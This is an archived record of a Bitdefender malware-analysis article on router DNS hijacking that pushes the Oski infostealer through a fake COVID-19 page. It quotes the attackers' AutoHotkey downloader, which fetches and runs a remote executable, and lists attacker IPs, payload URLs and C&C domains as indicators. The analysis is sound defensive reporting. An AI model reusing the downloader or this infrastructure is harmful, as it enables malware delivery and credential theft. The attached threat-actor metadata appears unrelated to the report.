{
    "id": "cfc0e957-079b-4336-a094-240f482c3141",
    "created_at": "2023-01-12T15:08:44.814748Z",
    "updated_at": "2025-03-27T02:16:26.535481Z",
    "deleted_at": null,
    "sha1_hash": "1099189cc4dbed05a6d14eefd66ae0a615653f01",
    "title": "2020-03-25 - New Router DNS Hijacking Attacks Abuse Bitbucket to Host Infostealer",
    "authors": "",
    "file_creation_date": "2022-05-27T19:59:43Z",
    "file_modification_date": "2022-05-27T19:59:43Z",
    "file_size": 643346,
    "plain_text": "# New Router DNS Hijacking Attacks Abuse Bitbucket to Host Infostealer\n\n**[labs.bitdefender.com/2020/03/new-router-dns-hijacking-attacks-abuse-bitbucket-to-host-infostealer/](https://labs.bitdefender.com/2020/03/new-router-dns-hijacking-attacks-abuse-bitbucket-to-host-infostealer/)**\n\n[Anti-Malware Research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n7 min read\n\n[Liviu ARSENE](http://10.10.0.46/blog/labs/author/larsene/)\nMarch 25, 2020\n\nOne product to protect all your devices, without slowing them down.\n\n[Free 90-day trial](http://10.10.0.46/media/html/consumer/new/get-your-90-day-trial-opt/index.html)\n\n\n-----\n\nBitdefender researchers have recently found a new attack that targets home routers and\nchanges their DNS settings to redirect victims to a malware-serving website that delivers\nthe Oski infostealer as a final payload.\n\nWhat’s interesting about the attack is that it stores malicious payloads using Bitbucket, the\npopular web-based version control repository hosting service. To make sure the victim\ndoesn’t suspect foul play, attackers also abuse TinyURL, the popular URL-shortening web\nservice, to hide the link to the Bitbucket payload.\n\nSure enough, the webpage to which users are redirected mentions the Coronavirus\npandemic, promising to offer for download an application that will give out “the latest\ninformation and instructions about coronavirus (COVID-19)”.\n\nCOVID-19 is a recurring theme that cybercriminals have been abusing to trap victims.\n[Malicious reports involving coronavirus-themed malware have increased five-fold in March](https://labs.bitdefender.com/2020/03/5-times-more-coronavirus-themed-malware-reports-during-march/)\n[from February, with attackers using phishing scams that exploit Coronavirus misinformation](https://hotforsecurity.bitdefender.com/blog/coronavirus-phishing-scams-exploit-misinformation-22599.html)\n[and fear regarding medical supply shortage.](https://hotforsecurity.bitdefender.com/blog/coronavirus-medical-supply-scams-prey-on-fear-22570.html)\n\n### Key findings:\n\nMostly targets Linksys routers, bruteforcing remote management credentials\nHijacks routers and alters their DNS IP addresses\nRedirects a specific list of webpages/domains to a malicious Coronavirus-themed\nwebpage\nUses Bitbucket to store malware samples\n\n\n-----\n\nUses TinyURL to hide Bitbucket link\nDrops Oski inforstealer malware\n\n### How the attack works\n\nWhile it’s not uncommon for hackers to piggyback global news, such as the pandemic, to\ndeliver phishing emails laced with tainted attachments, this recent development proves they\nare nothing if not creative in compromising victims.\n\nAttackers seem to have been probing the internet for vulnerable routers, managing to\ncompromise them – potentially via bruteforcing passwords – and changing their DNS IP\nsettings.\n\nDNS settings are very important, as they work like a phone book. Whenever users type in\nthe name of a website, DNS services can send them to the corresponding IP address that\nserves that particular domain name. In a nutshell, DNS works pretty much like your\nsmartphones agenda: whenever you want to call someone you just look up their name\ninstead of having to memorize their phone number.\n\nOnce attackers change the DNS IP addresses, they can resolve any request and redirect\nusers to webpages that attackers control, without anyone being the wiser.\n\nThe DNS IP address are as follows:\n\n109.234.35.230\n94.103.82.249\n\nBelow is a list of some of the targeted domains that are redirected:\n\n“aws.amazon.com”\n“goo.gl”\n“bit.ly”\n“washington.edu”\n“imageshack.us”\n“ufl.edu”\n“disney.com”\n“cox.net”\n“xhamster.com”\n“pubads.g.doubleclick.net”\n“tidd.ly”\n“redditblog.com”\n“fiddler2.com”\n“winimage.com”\n\n\n-----\n\nWhen trying to reach one of the domains above, users are actually redirected towards an IP\naddress, 176.113.81.159, 193.178.169.148, 95.216.164.181, that displays a message\npurportedly from the World Health Organization, telling users to download and install an\napplication that offers instructions and information about COVID-19.\n\nWhat’s interesting is that, by changing the DNS settings on the router, users would actually\nbelieve they’ve landed on a legitimate webpage, except that it’s served from a different IP\naddress. For example, when users type “example.com”, instead of the webpage being\nserved from a legitimate IP address, it would be served from an attacker-controlled IP\nthat’sresolved by the malicious DNS settings. If the attacker-controlled webpage is a spoton facsimile, users would actually believe they’ve landed on a legitimate webpage, judging\nfrom the domain name in the browser’s address bar.\n\nAs in the screenshot below, whenever victims wanted to visit one of the targeted domains\nlisted above, attackers would simply display a message as if prompted by the legitimate\ndomain. Since the domain name displayed in the browser’s address bar is unchanged,\nvictims would have no reason to believe that the viewed message is being served from an\nattacker-controlled IP address.\n\nThe download button has the “href” tag (hyperlink) set to https://google.com/chrome so it\nseems clean when the victim hovers over the button. But actually an “on-click” event is set\nthat changes the URL to the malicious one, hidden in the URL shortened with TinyURL.\n\n\n-----\n\nAs soon as users hit “Download”, they actually download the malicious .exe file from the\nBitbucket repository, completely unaware.\n\nTo make the file seem legitimate (as if the filename is any indication of legitimacy), attackers\nnamed it “runset.EXE”, “covid19informer.exe”, or “setup_who.exe”.\n\nJudging from the flow of the attack, it seems that the initial payload is actually a downloader,\nfor which we have seen two variants:\n\na cab file which has embedded a .net file that uses TinyUrl service to download from\nthe bitbucket repo the final payload\nan autohotkey script which will directly download from the bitbucket repo the final\npayload.\n\n\n-----\n\n```\n; <COMPULTER: v1.1.22.07> \n #NoTrayIcon\n UrlDownloadToFile, https[:]//tiny.cc/w81hlz, %A_AppData%\\pre_set.exe \n Loop \n  { \n    IfExist, %A_AppData%\\pre_set.exe \n      { \n        RunWait, %A_AppData%\\pre_set.exe ooplod \n        Sleep, 1000 \n        ExitApp \n      }\n\n```\nIn the final stage of the attack a malicious file packed with MPRESS is downloaded. This\npayload is the Oski stealer that communicates with a C&C server for uploading the stolen\ninformation.\n\nOski is a relatively new infostealer that seems to have emerged in late 2019. Some of the\nfeatures that it packs revolve around extracting browser credentials and cryptocurrency\nwallet passwords, and its creators even brag that it can extract credentials stored in SQL\ndatabases of various Web browsers and Windows Registry.\n\nDuring the first stage, we also observed that the .net files have a URL\n(hxxps://iplogger[.]org/1l8Gp) that points to a statistics webpage that attackers could use to\nkeep track of infected IP addresses and the number of infected victims.\n\n### Victims\n\nThe current number of potential victims during the past couple of days is estimated at about\n1,193, judging from the cumulative number of downloads from the two Bitbucket\nrepositories we found to still be up.\n\nDuring the investigation, Bitdefender researchers found 4 Bitbucket repositories. This\nmeans that the number of victims could be a lot higher, as Bitbucket has already taken\ndown the other two repositories, preventing us from having a complete picture of the\nnumber of victims.\n\nAnother hit that reveals this to be a relatively new attack is Bitdefender’s telemetry showing\nthat it all started on March 18th, with a peak in activity on March 23rd (Fig. 1).\n\nWe estimate that the number of victims is likely to grow in the coming weeks, especially if\nattackers have set up other repositories, whether hosted on Bitbucket or other code\nrepository hosting services, as the Coronavirus pandemic remains a “hot topic”.\n\n\n-----\n\nWhile attackers are likely probing the internet for victims that have vulnerable routers,\nBitdefender’s own telemetry shows that victims in Germany, France, and the United States\naccount for over 73 percent of the total. These countries are also among those most\naffected by the Coronavirus outbreak, potentially explaining why attackers use the themed\nwebsite.\n\nIt’s still unclear how routers are being compromised but, based on available telemetry, it\nseems that attackers are bruteforcing some Linksys router models, either by directly\naccessing the router’s management console exposed online or by bruteforcing the Linksy\ncloud account.\n\nThese Linksys router features enable users to remotely dial into their home network from a\nbrowser or mobile device, by using a Linksys cloud account that can be accessed from\noutside the home network. Since most of the targeted routers seem to involve this particular\nmanufacturer, it’s plausible that this is also an attack vector that attackers exploit.\n\n\n-----\n\n### Stay Safe!\n\nIt’s recommended that, besides changing the router’s control panel access credentials\n(which are hopefully not the default ones), users should change their Linksys cloud account\ncredentials, or any remote management account for their routers, to avoid any takeovers via\nbruteforcing or credential-stuffing attacks.\n\nOf course, making sure that your router’s firmware is always up to date is also heartily\nrecommended, as it prevents attackers from exploiting unpatched vulnerabilities to take\nover the device.\n\nLast, but surely not least, make sure all of your devices have a security solution installed\nthat can prevent you from accessing phishing or fraudulent websites and from downloading\nand installing malware.\n\n### Indicators of Compromise\n\nThe indicators of compromise involve the downloader, the final stage payload, the URLs to\nthe repository, and the C&C of the final stage payload.\n\n\n-----\n\n```\n Downloader:              Final stage \n 04517dc9e3c0d387459730b0ea162d38   ffa9fd16191a5324e4ce3afd9fd77630 \n 652e3470f59ed2f3291e00959ed5490e   a67c9108b0df82d39ffafb77d5cb7eda \n d7f18f5f1fef14d1b146a3d68b9f24e4   992500a0649a0dfae25ef27756d28545  \n 6eaeb1f36537f5eaca379d85ddf5bb79   992500a0649a0dfae25ef27756d28545 \n 65c5a195b77e36fa8aff0547ae2e49b9   ffa9fd16191a5324e4ce3afd9fd77630 \n 4de9a19e3c6232491917cf1cd2b60969   66d6e5f33cf9a6d21df1fee04c2df7cd \n Repo URL \n https[:]//bitbucket[.]org/softup23/self/downloads/setup_who.exe \n https[:]//bitbucket.org/verify19/update19/downloads/setup_pr.exe \n https[:]//bitbucket.org/whoupd/s1/downloads/setup_who.exe \n https[:]//bitbucket.org/whoupd/s1/downloads/setup_who.exe \n https[:]//bitbucket[.]org/softup23/self/downloads/setup_who.exe \n https://bitbucket.org/softcov3/v1/downloads/file_signed.exe\n C&C \n whoer-vpn.net \n emailonlinechase.com \n emailonlinechase.com \n emailonlinechase.com \n whoer-vpn.net \n whoer-vpn.net\n\n```\n_Note: This article is based on technical information provided courtesy of the Bitdefender_\n_Labs teams._\n\n**TAGS**\n\n[anti-malware research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n**AUTHOR**\n\n## Liviu ARSENE\n\nLiviu Arsene is the proud owner of the secret to the fountain of never-ending energy. That's\nwhat's been helping him work his everything off as a passionate tech news editor for the\npast few years.\n\n[View all posts](http://10.10.0.46/blog/labs/author/larsene/)\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-25 - New Router DNS Hijacking Attacks Abuse Bitbucket to Host Infostealer.pdf"
    ],
    "report_names": [
        "2020-03-25 - New Router DNS Hijacking Attacks Abuse Bitbucket to Host Infostealer.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536124,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653681583,
    "ts_modification_date": 1653681583,
    "files": {
        "pdf": "https://archive.orkl.eu/1099189cc4dbed05a6d14eefd66ae0a615653f01.pdf",
        "text": "https://archive.orkl.eu/1099189cc4dbed05a6d14eefd66ae0a615653f01.txt",
        "img": "https://archive.orkl.eu/1099189cc4dbed05a6d14eefd66ae0a615653f01.jpg"
    }
}